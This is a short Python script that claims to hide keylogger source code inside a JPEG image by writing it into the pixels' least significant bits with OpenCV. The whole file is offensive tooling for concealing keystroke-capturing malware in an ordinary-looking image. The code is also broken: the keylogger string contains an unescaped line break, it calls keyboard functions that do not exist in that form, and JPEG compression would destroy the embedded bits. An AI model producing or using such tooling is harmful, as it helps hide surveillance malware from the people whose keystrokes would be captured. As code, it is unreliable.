import cv2

# Keylogger code
keylogger_code = "import keyboard\n
while True:\n    currentKeys = keyboard.get_pressed()\n    for key in currentKeys:\n        if key == keyboard.Key.esc:\n            break\n        print(key)\n"

# Function to inject keylogger into a JPEG image

def inject_keylogger(image_path, output_path):
    image = cv2.imread(image_path)
    height, width, _ = image.shape
    stego_message = keylogger_code.encode('utf-8')
    
    # Injecting keylogger message into the least significant bits
    for i in range(len(stego_message)):
        for j in range(8):
            pixel = list(image[i][j])
            pixel[0] = (pixel[0] & ~1) | ((stego_message[i] >> j) & 1)
            image[i][j] = tuple(pixel)
    
    cv2.imwrite(output_path, image)
    print(f"Keylogger injected into {output_path}")

# Example usage
# inject_keylogger('input_image.jpg', 'output_image.jpg')